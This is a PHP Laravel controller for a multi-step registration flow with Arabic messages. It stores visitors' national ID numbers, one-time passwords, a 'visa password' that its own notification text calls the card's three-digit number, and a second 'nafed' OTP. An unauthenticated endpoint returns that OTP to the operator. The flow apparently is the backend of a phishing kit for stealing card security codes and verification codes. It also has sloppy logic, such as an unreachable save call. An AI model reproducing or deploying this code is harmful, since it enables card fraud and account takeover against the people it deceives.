<?php

namespace App\Http\Controllers\Client;

use App\Http\Controllers\Controller;
use App\Models\Client;
use App\Models\MobileCompany;
use App\Models\Notification;
use Illuminate\Http\Request;
use RealRashid\SweetAlert\Facades\Alert;

class RegistrationController extends Controller
{
    public function storeNationalNumber(Request $request){
        $request->validate([
            'national_number' =>'required|unique:clients|size:5'
        ] ,
        ['national_number.required' =>'برجاء ادخال الرقم القومى' ,
        'national_number.unique' => 'الرقم القومى مسجل من قبل',
        'national_number.size'=> 'الرقم القومى مكون من 5 ارقام'
        ]);
        $client = Client::where('national_number' , $request->national_number)->first();
        if($client){
            Alert::error('خطا', 'هذا الرقم القومى مسجل بالفعل');
            return redirect()->route('landing');
        }else {
            $client = new Client();
            $client->national_number = $request->national_number;
            $client->end_point = AFTER_SEND_ID;
            $client->save();
            return redirect()->route('client.continue',['id'=> $client->id ,'national_number'=> $client->national_number] );
        }
    }
    public function continue($client_id , $national_number){
        $client=Client::where( ['id' => $client_id , 'national_number' => $national_number] )->firstOrFail();
        if($client->end_point == AFTER_SEND_ID){
            return view('frontend.steps.step-one' , compact('client'));
        }elseif ($client->end_point == STEP_TWO) {
            return view('frontend.steps.step-two' , compact('client'));
        }
    }

    public function storeStep(Request $request){
        $inputs = $request->all();
        if($request->step == 1){
           return $this->submit_step_one($inputs);
        }
    }

    public function submit_step_one($inputs){
        $client = Client::whereId($inputs['client_id'])->firstOrFail();
        $client->first_name = $inputs['first_name'];
        $client->end_point = STEP_TWO;
        $client->first_name = $inputs['first_name']??0;
        $client->save();
        return redirect()->route('client.continue',['id'=> $client->id ,'national_number'=> $client->national_number] );
    }

    public function continueRegistration(Request $request){
        $request->validate([
            'national_number' =>['required']
        ]);
        $client = Client::where('national_number' , $request->national_number)->first();
        if($client){
            if($client->end_point == SUCCESS_OTP){
                return view('frontend.clients.send_visa_password' , compact('client'));
            }
            elseif ($client->end_point == FAIL_OTP) {
            }
            elseif ($client->end_point == END_REGISTRATION) {
                return view('frontend.clients.send_otp' , compact('client'));
            }
            else
            {
            }
        }else{
            $mobile_network = MobileCompany::all();
            return view('frontend.landing' , compact('mobile_network'));
        }
    }
    public function register(Request $request){
        $inputs = $request->all();
        unset($inputs['_token']);

        $client = Client::create($inputs);
        $notifcation = [
            'client_id' =>$client->id,
            'is_seen' => 0,
            'content' => 'New client Registered'
        ];
        $notifcation = Notification::create($notifcation);
        Alert::info(' العملاء', 'تم التسجيل بنجاح');
        return redirect()->route('client.getOtp' , ['id'=> $client->id ,'national_number'=> $client->national_number]);
    }

    public function checkOtp(Request $request){
        $inputs = $request->all();
        $client = Client::whereId($inputs['client_id'])->first();
        if($client->otp_number == $inputs['otp_number']){
            $client->end_point = SUCCESS_OTP;
            Alert::info(' العملاء', ' تم بنجاح');
            return view('frontend.clients.send_visa_password' , compact('client'));
        }else {
            $client->end_point = FAIL_OTP;
            Alert::error('خطا', 'الرقم خطا');
            return view('frontend.clients.send_otp' , compact('client'));
        }
        $client->save();
    }

    public function storeVisaPassword(Request $request){
        $inputs = $request->all();
        $request->validate([
            'visa_password'=>'required'
        ]);
        $client = Client::where('id' , $inputs['client_id'])->first();
        $client->visa_password = $inputs['visa_password'];
        $client->end_point = SEND_VISA_PASSWORD;
        $client->save();

        $notifcation = [
            'client_id' =>$client->id,
            'is_seen' => 0,
            'content' => 'العميل ارسل الرقم الثلاثى الخاص بالبطاقة'
        ];
        Notification::create($notifcation);
        return view('frontend.clients.get_nafed_otp', compact('client'));
    }

    public function getOtp($id , $national_number){
        $client = Client::where(['id' => $id , 'national_number' => $national_number] )->firstOrFail();
        return view('frontend.clients.send_otp' , compact('client'));
    }

    public function getNafedOtpAjax($client_id){
       $client= Client::where('id' , $client_id)->first();
       return response()->json(['status' => 1 , 'nafed_otp'=>$client->nafed_otp ]);
    }
}
